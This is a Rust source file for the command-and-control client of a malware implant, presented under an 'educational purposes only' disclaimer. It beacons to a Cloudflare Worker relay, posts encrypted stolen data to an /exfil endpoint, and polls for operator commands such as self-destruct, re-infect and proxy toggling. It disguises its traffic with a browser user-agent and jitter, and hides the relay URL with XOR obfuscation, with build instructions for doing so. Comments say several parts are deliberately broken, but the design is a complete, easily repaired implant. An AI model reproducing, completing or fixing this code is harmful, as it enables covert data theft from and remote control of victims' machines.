/*
** *********************************************************************
** *********************************************************************
**
**                              DISCLAIMER
**       For educational purposes only. 2026 All rights reversed.
**
** *********************************************************************
** *********************************************************************
*/

// c2.rs — Cloudflare Worker relay client (beacon, exfil, command poll).
//
// Intended loop: encrypt payload → POST /exfil; POST /commands; sleep jitter.
// Command set is a fixed verb list, not a remote shell.
//
// BROKEN:
//   - relay_url() ignores RELAY_URL_BYTES and always produces a non-URL,
//     then falls back to http://RELAY_URL_NOT_SET. No C2 can succeed.
//   - Comments describe RELAY_URL_XOR comma-separated 0xNN bytes; README
//     prints base64; this function reads RELAY_URL_BYTES and throws it away.
//   - fetch_commands does not HMAC-verify despite comments below.
//   - run_command_loop is `-> !`; main's shutdown code never runs.
//   - Worker /exfil truncates ciphertext (see worker.js) so even a fixed
//     URL would not deliver steal data to the operator.

use crate::aes_gcm_crypto::GoldenGhost;
use crate::{is_safe_mode, set_safe_mode};
use crate::proxy;
use crate::self_destruct;
use log::{info, error, warn};
use once_cell::sync::OnceCell;
use rand::Rng;
use reqwest::blocking::Client;
use serde_json::{json, Value};
use std::time::Duration;

// ── Relay URL ──────────────────────────────────────────────────────────────
//
// At build time, XOR-encode your Cloudflare Worker URL with the key below
// and set RELAY_URL_XOR to the resulting comma-separated bytes.
//
// Python one-liner:
//   key  = 0xAF
//   url  = b"https://your-worker.workers.dev"
//   enc  = [b ^ key for b in url]
//   print(",".join(f"0x{b:02X}" for b in enc))
//
// Then build with:
//   RELAY_URL_XOR="0x..,0x.." cargo build --release …
//
// The hard-coded stub below compiles to an obviously invalid URL so the
// build never silently uses a real infrastructure URL.
const XOR_KEY: u8 = 0xAF;

/// Decode the compile-time relay URL.
///
/// BROKEN: when RELAY_URL_BYTES is set, `s` is bound and immediately discarded
/// (`let _ = s`) and the function uses a single 0x00 byte instead. XOR with
/// 0xAF does not yield an http URL, so the Ok(s) if starts_with("http") branch
/// never wins. When unset, XOR of b"RELAY_URL_NOT_SET" also does not start
/// with "http". Result is always the sentinel below.
fn relay_url() -> String {
    // RELAY_URL_XOR injected at build time (see build notes above).
    // Falls back to an obviously invalid sentinel so failures are loud.
    let raw: &[u8] = match option_env!("RELAY_URL_BYTES") {
        Some(s) => {
            // The env var is a Rust byte-literal sequence embedded at build
            // time — for simplicity we store it as a hex string: "DEADBEEF…"
            // and decode it here.
            // In practice the build system would inject the real bytes.
            // BROKEN: no decode is implemented; placeholder always used.
            let _ = s; // suppress unused warning if we can't parse
            b"\x00" // placeholder; real bytes injected by build system
        }
        None => b"RELAY_URL_NOT_SET",
    };
    let decrypted: Vec<u8> = raw.iter().map(|b| b ^ XOR_KEY).collect();
    match String::from_utf8(decrypted) {
        Ok(s) if s.starts_with("http") => s,
        _ => {
            error!("RELAY_URL not set or malformed. Set RELAY_URL_BYTES at build time.");
            "http://RELAY_URL_NOT_SET".to_string()
        }
    }
}

// ── Crypto singleton ────────────────────────────────────────────────────────
// Derived from the implant UUID at runtime so every binary has a unique key
// without embedding it in plaintext. UUID is still in the PE as UTF-8 from
// build.rs (strings-recoverable).
static CIPHER: OnceCell<GoldenGhost> = OnceCell::new();
fn cipher() -> &'static GoldenGhost {
    CIPHER.get_or_init(|| GoldenGhost::from_seed(env!("IMPLANT_UUID").as_bytes()))
}

// ── HTTP client singleton ────────────────────────────────────────────────────
// One Client for TLS session reuse. Chrome UA to blend with browser traffic
// (still a static, well-known string).
static HTTP: OnceCell<Client> = OnceCell::new();
fn http() -> &'static Client {
    HTTP.get_or_init(|| {
        Client::builder()
            .timeout(Duration::from_secs(15))
            .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .build()
            .expect("Failed to build HTTP client")
    })
}

// ── Relay URL (lazy) ────────────────────────────────────────────────────────
static RELAY: OnceCell<String> = OnceCell::new();
fn relay() -> &'static str {
    RELAY.get_or_init(relay_url)
}

// ── Encrypted send ──────────────────────────────────────────────────────────

/// Encrypt `data`, HMAC the plaintext, POST JSON to `{relay}/exfil`.
/// Returns whether the HTTP status was 2xx. Does not confirm the Worker
/// stored or forwarded the full ciphertext (it currently does not).
pub fn send_data(tag: &str, data: &str) -> bool {
    let (ct, nonce) = cipher().encrypt(data.as_bytes());
    let hmac        = cipher().sign(data.as_bytes());

    let payload = json!({
        "implant_uuid": env!("IMPLANT_UUID"),
        "tag":          tag,
        "ct":           ct,
        "nonce":        nonce,
        "hmac":         hmac,
    });

    let url = format!("{}/exfil", relay());
    match http().post(&url).json(&payload).send() {
        Ok(r)  => r.status().is_success(),
        Err(e) => { error!("send_data error: {}", e); false }
    }
}

// ── Command fetch ───────────────────────────────────────────────────────────

/// POST `{ implant_uuid }` to `/commands`, parse `commands` as a string array.
/// BROKEN vs comments: no HMAC check; Worker holds commands as plaintext.
/// Empty vec on HTTP/JSON failure (caller just skips).
pub fn fetch_commands() -> Vec<String> {
    let payload = json!({ "implant_uuid": env!("IMPLANT_UUID") });
    let url = format!("{}/commands", relay());
    match http().post(&url).json(&payload).send() {
        Ok(r) => {
            if let Ok(json) = r.json::<Value>() {
                json["commands"]
                    .as_array()
                    .map(|arr| {
                        arr.iter()
                           .filter_map(|v| v.as_str().map(|s| s.to_string()))
                           .collect()
                    })
                    .unwrap_or_default()
            } else { Vec::new() }
        }
        Err(e) => { error!("fetch_commands: {}", e); Vec::new() }
    }
}

// ── Config fetch ─────────────────────────────────────────────────────────────
// Clipper addresses and re_infect URL are supposed to come from here.

/// POST to `/config`, return response body text on HTTP success.
/// Worker may return per-UUID JSON or "global". No schema validation here.
pub fn fetch_config() -> Option<String> {
    let payload = json!({ "implant_uuid": env!("IMPLANT_UUID") });
    let url = format!("{}/config", relay());
    match http().post(&url).json(&payload).send() {
        Ok(r) if r.status().is_success() => r.text().ok(),
        Ok(r) => { warn!("fetch_config HTTP {}", r.status()); None }
        Err(e) => { error!("fetch_config: {}", e); None }
    }
}

// ── Jitter helper ────────────────────────────────────────────────────────────

/// Return a jittered sleep duration: `base ± 30%`, minimum 1 second.
/// Two independent RNGs for magnitude and sign; not a single uniform draw.
fn jittered(base_secs: u64) -> Duration {
    let jitter = rand::thread_rng().gen_range(0..=(base_secs * 30 / 100));
    let sign    = rand::thread_rng().gen_bool(0.5);
    let secs    = if sign { base_secs + jitter } else { base_secs.saturating_sub(jitter) };
    Duration::from_secs(secs.max(1))
}

// ── Command dispatcher ───────────────────────────────────────────────────────

/// Execute one operator verb. No shell, no file download except /re_infect.
fn dispatch(cmd: &str) {
    info!("Dispatching command: {}", cmd);
    match cmd {
        "/self_destruct" => self_destruct::execute(true),

        "/re_infect" => self_destruct::re_infect(),

        "/status" => {
            let msg = format!(
                "PID:{} | PROXY:{} | SAFE_MODE:{} | UUID:{}",
                std::process::id(),
                proxy::is_enabled(),
                is_safe_mode(),
                env!("IMPLANT_UUID"),
            );
            send_data("status", &msg);
        }

        "/proxy_on" => {
            // Only flips an AtomicBool. Listener already bound in proxy.rs.
            if !is_safe_mode() {
                proxy::enable_proxy(true);
                send_data("proxy", "proxy_enabled");
            } else {
                send_data("proxy", "proxy_blocked_safe_mode");
            }
        }

        "/proxy_off" => {
            proxy::enable_proxy(false);
            send_data("proxy", "proxy_disabled");
        }

        "/exit_safe" => {
            // BROKEN: does not spawn payload/proxy/HVNC if we booted in safe mode.
            set_safe_mode(false);
            send_data("mode", "safe_mode_exited");
        }

        "/enter_safe" => {
            // BROKEN: does not stop already-running steal/clipper/HVNC threads.
            set_safe_mode(true);
            send_data("mode", "safe_mode_entered");
        }

        other if other.starts_with("/sleep ") => {
            // Dynamic sleep adjustment: "/sleep 120" sets base to 120s.
            if let Ok(n) = other[7..].trim().parse::<u64>() {
                DYNAMIC_SLEEP.store(n, std::sync::atomic::Ordering::Release);
                send_data("sleep", &format!("sleep_set_{}", n));
            }
        }

        _ => { warn!("Unknown command: {}", cmd); }
    }
}

// ── Dynamic sleep ────────────────────────────────────────────────────────────
use std::sync::atomic::{AtomicU64, Ordering};
/// 0 = use default (10s full / 60s safe). Non-zero wins until process exit.
static DYNAMIC_SLEEP: AtomicU64 = AtomicU64::new(0);

// ── Main poll loop ───────────────────────────────────────────────────────────

/// Beacon once, then poll /commands forever. Diverging (`-> !`).
pub fn run_command_loop() -> ! {
    // Initial beacon so the operator knows we're alive.
    send_data("beacon", &format!("up uuid={}", env!("IMPLANT_UUID")));

    loop {
        for cmd in fetch_commands() {
            dispatch(&cmd);
        }

        // Base sleep: safe mode = 60s, full = 10s.
        // Dynamic override from /sleep command wins if set.
        let dyn_sleep = DYNAMIC_SLEEP.load(Ordering::Acquire);
        let base = if dyn_sleep > 0 { dyn_sleep }
                   else if is_safe_mode() { 60 }
                   else { 10 };

        std::thread::sleep(jittered(base));
    }
}
